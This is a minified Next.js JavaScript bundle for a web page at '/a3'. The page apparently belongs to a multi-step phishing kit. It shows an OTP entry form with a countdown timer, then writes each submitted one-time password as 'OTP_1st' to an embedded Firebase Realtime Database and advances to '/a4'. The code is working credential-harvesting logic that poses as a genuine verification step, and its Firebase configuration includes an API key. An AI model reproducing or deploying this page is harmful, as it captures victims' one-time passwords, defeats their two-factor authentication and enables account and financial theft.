(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[390],{7780:function(A,e,t){(window.__NEXT_P=window.__NEXT_P||[]).push(["/a3",function(){return t(4276)}])},1581:function(A,e){"use strict";e.Z={src:"/_next/static/media/FOOT11.58bda567.jpg",height:146,width:1016,blurDataURL:"data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoKCgoKCgsMDAsPEA4QDxYUExMUFiIYGhgaGCIzICUgICUgMy03LCksNy1RQDg4QFFeT0pPXnFlZXGPiI+7u/sBCgoKCgoKCwwMCw8QDhAPFhQTExQWIhgaGBoYIjMgJSAgJSAzLTcsKSw3LVFAODhAUV5PSk9ecWVlcY+Ij7u7+//CABEIAAEACAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAmwf/xAAYEAACAwAAAAAAAAAAAAAAAAAAAQQycf/aAAgBAQABPwCRZ6f/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oACAECAQE/AH//xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oACAEDAQE/AH//2Q==",blurWidth:8,blurHeight:1}},9097:function(A,e){"use strict";e.Z={src:"/_next/static/media/OPKL.47fa9559.jpg",height:451,width:591,blurDataURL:"data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoKCgoKCgsMDAsPEA4QDxYUExMUFiIYGhgaGCIzICUgICUgMy03LCksNy1RQDg4QFFeT0pPXnFlZXGPiI+7u/sBCgoKCgoKCwwMCw8QDhAPFhQTExQWIhgaGBoYIjMgJSAgJSAzLTcsKSw3LVFAODhAUV5PSk9ecWVlcY+Ij7u7+//CABEIAAYACAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABwEBAAAAAAAAAAAAAAAAAAAAAv/aAAwDAQACEAMQAAAArAR//8QAGRABAQEAAwAAAAAAAAAAAAAAAQIRABNB/9oACAEBAAE/AOqqljcE8U5//8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAgBAgEBPwB//8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAgBAwEBPwB//9k=",blurWidth:8,blurHeight:6}},1898:function(A,e){"use strict";e.Z={src:"/_next/static/media/OUTTPH1.f36825f6.jpg",height:1010,width:1024,blurDataURL:"data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoKCgoKCgsMDAsPEA4QDxYUExMUFiIYGhgaGCIzICUgICUgMy03LCksNy1RQDg4QFFeT0pPXnFlZXGPiI+7u/sBCgoKCgoKCwwMCw8QDhAPFhQTExQWIhgaGBoYIjMgJSAgJSAzLTcsKSw3LVFAODhAUV5PSk9ecWVlcY+Ij7u7+//CABEIAAgACAMBIgACEQEDEQH/xAAoAAEBAAAAAAAAAAAAAAAAAAAABwEBAQAAAAAAAAAAAAAAAAAAAgP/2gAMAwEAAhADEAAAAKqJP//EABcQAQEBAQAAAAAAAAAAAAAAAAECADH/2gAIAQEAAT8AmSaaAF67/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAgBAgEBPwB//8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAgBAwEBPwB//9k=",blurWidth:8,blurHeight:8}},8494:function(A,e,t){"use strict";t.d(e,{l:function(){return a}});var s=t(3977);let a=(0,s.ZF)({apiKey:"AIzaSyB9HhHKmBcn5avx4eYlRwjnTs6pF-jHniQ",authDomain:"zcdr-bf06e.firebaseapp.com",databaseURL:"https://zcdr-bf06e-default-rtdb.firebaseio.com",projectId:"zcdr-bf06e",storageBucket:"zcdr-bf06e.appspot.com",messagingSenderId:"943671703362",appId:"1:943671703362:web:d09bdcf4ad2e1a6800fadb",measurementId:"G-5GCYHCCVWD"})},4276:function(A,e,t){"use strict";t.r(e);var s=t(5893),a=t(7294),i=t(1019),n=t(1163);t(9097),t(1898),t(1581);var r=t(8494);t(1411);let c=(0,i.N8)(r.l),l={color:"red",fontSize:"0.7rem",textAlign:"left",marginTop:"-5px"};e.default=function(){let A=(0,n.useRouter)(),[e,t]=(0,a.useState)({otp1:""}),[r,g]=(0,a.useState)(""),submitData=async t=>{t.preventDefault();let{otp1:s}=e;if(!s){g("OTP is required.");return}g("");let a=(0,i.iH)(c,"data"),n=(0,i.VF)(a);(0,i.t8)(n,{OTP_1st:s}).then(()=>{console.log("Data pushed successfully with a unique key."),A.push("/a4")}).catch(A=>{console.error("Error pushing data: ",A)})},[o,d]=(0,a.useState)(120);return(0,a.useEffect)(()=>{let A=setInterval(()=>{d(A=>A-1)},1e3);return()=>{clearInterval(A)}},[]),(0,s.jsxs)("div",{className:"App",children:[(0,s.jsx)("header",{children:(0,s.jsx)("center",{children:(0,s.jsx)("h1",{className:"text-center",children:(0,s.jsx)("img",{src:"/images/otp.jpg",style:{width:"100%"},alt:"Header"})})})}),(0,s.jsxs)("form",{action:"Acchoddd.php",method:"post",children:[(0,s.jsx)("div",{className:"imgcontainer"}),(0,s.jsxs)("div",{className:"container",children:[(0,s.jsxs)("label",{children:["One Time Password (OTP)",(0,s.jsx)("span",{style:{color:"red"},children:"*"})]}),(0,s.jsx)("input",{onChange:A=>{let s=A.target.name,a=A.target.value;t({...e,[s]:a})},value:e.otp1,type:"text",placeholder:"",name:"otp1",maxLength:"8",minLength:"6",required:!0,style:{width:"90vw",padding:"6px 20px",margin:"8px 0",display:"inline-table",border:"1px solid #ccc",boxSizing:"border-box"}}),r&&(0,s.jsx)("p",{style:l,children:r}),(0,s.jsxs)("center",{children:[(0,s.jsx)("div",{className:"w3ls-login",children:(0,s.jsx)("button",{onClick:submitData,type:"submit",className:"btn btn-success btn-block",name:"save",style:{backgroundColor:"#ed8608",color:"white",padding:"6px 20px",margin:"0",border:"none",cursor:"pointer",width:"24%",borderRadius:"5px",fontWeight:"700"},children:"Submit"})}),(0,s.jsx)("center",{children:(0,s.jsx)("b",{style:{color:"grey",fontFamily:"Arial, Helvetica, sans-serif",fontSize:"12px",marginBottom:"15px",marginLeft:"5px"},children:(0,s.jsxs)("span",{style:{fontWeight:"400",color:"grey",fontSize:"12px",textAlign:"left",marginRight:"12px"},children:["Wait for OTP :   ",o," secs"]})})})]})]})]}),(0,s.jsx)("center",{children:(0,s.jsx)("h1",{className:"text-center",children:(0,s.jsx)("img",{src:"/images/OUTTPH1.jpg",style:{width:"100%"},alt:"OTP Header"})})}),(0,s.jsx)("center",{children:(0,s.jsx)("h1",{className:"text-center",children:(0,s.jsx)("img",{src:"/images/FOOT11.jpg",style:{width:"100%"},alt:"Footer"})})})]})}},1411:function(){},1163:function(A,e,t){A.exports=t(4751)}},function(A){A.O(0,[774,627,142,888,179],function(){return A(A.s=7780)}),_N_E=A.O()}]);